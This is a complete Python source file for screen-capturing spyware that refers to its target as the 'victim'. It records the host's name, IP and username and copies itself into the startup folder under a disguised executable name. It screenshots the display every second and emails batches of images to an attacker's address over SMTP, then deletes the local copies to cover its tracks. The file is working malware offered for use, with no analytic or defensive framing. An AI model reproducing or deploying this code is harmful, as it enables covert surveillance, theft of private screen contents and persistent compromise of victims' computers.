import pyautogui
import time
import socket
import os
import smtplib
import shutil
import platform
from email.message import EmailMessage
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

class VictimInfo:
    def __init__(self):
        self.system = platform.platform()
        self.hostname = socket.gethostname()
        self.ip = socket.gethostbyname(self.hostname)
        self.user = os.getlogin()
        self.execution_dir = os.path.dirname(__file__)
        self.images_dir = os.getenv('IMAGES_DIR')
        self.startup_dir = os.getenv('STARTUP_DIR').format(user=self.user)

    def log_info(self):
        return f"ℹ️ - LOG INFORMATION:\n\n🖥️ | Hostname: {self.hostname}\n⚙️ | System: {self.system}\n📍 | IP: {self.ip}"


class FileManager:
    @staticmethod
    def copy_to_startup(original_filename, copied_filename, startup_dir):
        source_path = os.path.join(os.path.dirname(__file__), original_filename)
        destination_path = os.path.join(startup_dir, copied_filename)

        if not os.path.isfile(source_path):
            print(f"Error: The file {source_path} does not exist.")
            return

        try:
            shutil.copy2(source_path, destination_path)
            print(f"File copied to {startup_dir}")
        except Exception as e:
            print(f"Error during copying: {e}")


class EmailManager:
    @staticmethod
    def send_email(subject, body, images_dir):
        try:
            msg = EmailMessage()
            msg["From"] = os.getenv('EMAIL_SENDER')
            msg["To"] = os.getenv('EMAIL_RECEIVER')
            msg["Subject"] = subject
            msg.set_content(body)

            for image in os.listdir(images_dir):
                image_path = os.path.join(images_dir, image)
                with open(image_path, "rb") as file:
                    msg.add_attachment(file.read(), maintype='image', subtype='png', filename=image)

            server = smtplib.SMTP(os.getenv('SMTP_SERVER'), int(os.getenv('SMTP_PORT')))
            server.starttls()
            server.login(os.getenv('EMAIL_SENDER'), os.getenv('EMAIL_PASSWORD'))
            server.send_message(msg)
            server.close()

            shutil.rmtree(images_dir)
        except Exception as e:
            shutil.rmtree(images_dir)
            print(f"Error sending email: {e}")


class ScreenLogger:
    def __init__(self, images_dir):
        self.images_dir = images_dir
        self.count = 0

        if not os.path.exists(self.images_dir):
            os.mkdir(self.images_dir)

    def take_screenshots(self):
        while True:
            screenshot = pyautogui.screenshot()
            screenshot.save(os.path.join(self.images_dir, f"PIC-{self.count}.png"))
            self.count += 1

            if self.count >= 20:
                victim_info = VictimInfo()
                EmailManager.send_email(f"🕵🏻 - User Grabbed: {victim_info.hostname}", victim_info.log_info(), self.images_dir)
                self.count = 0

            time.sleep(1)


if __name__ == "__main__":
    victim_info = VictimInfo()
    FileManager.copy_to_startup("ScreenLogger.py", "testestartup-NOMEALTERADO.exe", victim_info.startup_dir)

    screen_logger = ScreenLogger(victim_info.images_dir)
    screen_logger.take_screenshots()
